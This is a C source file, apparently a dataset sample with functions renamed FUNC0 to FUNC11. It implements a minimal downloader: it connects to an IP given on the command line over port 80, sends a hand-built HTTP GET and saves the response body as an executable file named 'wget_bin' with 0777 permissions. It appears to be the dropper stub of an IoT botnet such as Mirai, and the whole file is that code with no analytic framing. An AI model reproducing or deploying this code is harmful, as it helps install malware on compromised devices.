#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
typedef  int /*<<< orphan*/  recvbuf ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 char* DOWNLOAD_MSG ; 
 int DOWNLOAD_MSG_LEN ; 
 char* EXEC_MSG ; 
 int EXEC_MSG_LEN ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int O_CREAT ; 
 int O_TRUNC ; 
 int O_WRONLY ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int STDOUT ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int FUNC3 (int,struct sockaddr_in*,int) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int FUNC5 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int FUNC7 (int,char*,int) ; 
 int FUNC8 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (int,char*,int) ; 

int FUNC11(int argc, char **args)
{
    char recvbuf[128];
    struct sockaddr_in addr;
    int sfd, ffd;
    unsigned int header_parser = 0;

    FUNC10(STDOUT, EXEC_MSG, EXEC_MSG_LEN);

    addr.sin_family = AF_INET;
    addr.sin_port = FUNC0(80);
    addr.sin_addr.s_addr = FUNC4(args[1]);

    ffd = FUNC5("wget_bin", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    sfd = FUNC8(AF_INET, SOCK_STREAM, 0);

#ifdef DEBUG
    if (ffd == -1)
        printf("Failed to open file!\n");
    if (sfd == -1)
        printf("Failed to call socket()\n");
#endif

    if (sfd == -1 || ffd == -1)
        FUNC1(1);

    if (FUNC3(sfd, &addr, sizeof (struct sockaddr_in)) == -1)
        FUNC1(2);

    FUNC10(sfd, "GET ", 4);
    FUNC10(sfd, args[2], FUNC9(args[2]));
    FUNC10(sfd, " HTTP/1.1\r\n", 11);
    FUNC10(sfd, "Host: ", 6);
    FUNC10(sfd, args[3], FUNC9(args[3]));
    FUNC10(sfd, "\r\nConnection: close\r\n\r\n", 23);

    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = FUNC7(sfd, &ch, 1);

        if (ret != 1)
            FUNC1(4);
        header_parser = (header_parser << 8) | ch;
    }
#ifdef DEBUG
    printf("Finished receiving HTTP header\n");
#endif

    while (1)
    {
        int ret = FUNC7(sfd, recvbuf, sizeof (recvbuf));

        if (ret <= 0)
            break;
        FUNC10(ffd, recvbuf, ret);
    }

    FUNC2(sfd);
    FUNC2(ffd);
    FUNC10(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
    FUNC1(5);
}